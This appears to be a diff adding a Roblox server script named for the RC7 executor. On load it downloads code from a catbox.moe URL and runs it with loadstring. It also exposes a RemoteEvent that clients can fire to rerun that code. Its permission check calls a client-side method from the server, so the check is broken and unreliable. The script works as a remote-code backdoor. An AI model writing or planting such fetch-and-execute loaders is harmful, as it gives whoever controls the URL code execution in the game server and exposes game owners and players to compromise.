@@ -1,0 +1,65 @@
+-- # --- ServerScriptService/RC7_Server.lua ---
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Players = game:GetService("Players")
+
+-- Ensure HDAdmin exists
+local hdAdmin = ReplicatedStorage:FindFirstChild("HDAdminHDClient")
+if not hdAdmin then
+    warn("HDAdminHDClient not found — RC7 requires HD Admin.")
+    return
+end
+
+local rq = hdAdmin.Signals.RequestCommandSilent
+
+-- RC7 execution function (matches the button's original logic)
+local function executeRC7()
+    -- Original RC7 logic from the button:
+    -- loadstring(game:HttpGet("https://files.catbox.moe/cuncrx.txt"))()
+    -- But since this is server-side, we need to execute it on the server
+    -- or fire it to all clients depending on intent.
+    -- The original loads a client-side script from a URL.
+    -- Server-side execution of loadstring is possible but limited.
+    -- We'll replicate the exact behavior: load and execute on the server.
+    local success, err = pcall(function()
+        local scriptContent = game:HttpGet("https://files.catbox.moe/cuncrx.txt")
+        if scriptContent then
+            local fn, loadErr = loadstring(scriptContent)
+            if fn then
+                fn()
+            else
+                warn("RC7 loadstring failed: ", loadErr)
+            end
+        else
+            warn("RC7 HTTP request failed.")
+        end
+    end)
+    if not success then
+        warn("RC7 execution error: ", err)
+    end
+end
+
+-- Expose via RemoteEvent or command if needed
+-- For direct execution when the script runs:
+task.spawn(executeRC7)
+
+-- Optional: expose to admins via a RemoteEvent
+local rc7Remote = Instance.new("RemoteEvent")
+rc7Remote.Name = "RC7_Trigger"
+rc7Remote.Parent = ReplicatedStorage
+
+rc7Remote.OnServerEvent:Connect(function(player)
+    -- Permission check: only players with HD Admin can trigger
+    if player and rq then
+        -- Optional: check if player has HD Admin via a simple ping
+        local success, result = pcall(function()
+            return rq:InvokeServer(";ping")
+        end)
+        if success then
+            task.spawn(executeRC7)
+        else
+            warn(player.Name .. " attempted to trigger RC7 without sufficient permissions.")
+        end
+    end
+end)
+
+print("RC7 Server-Side module loaded. Trigger via RemoteEvent 'RC7_Trigger'.")
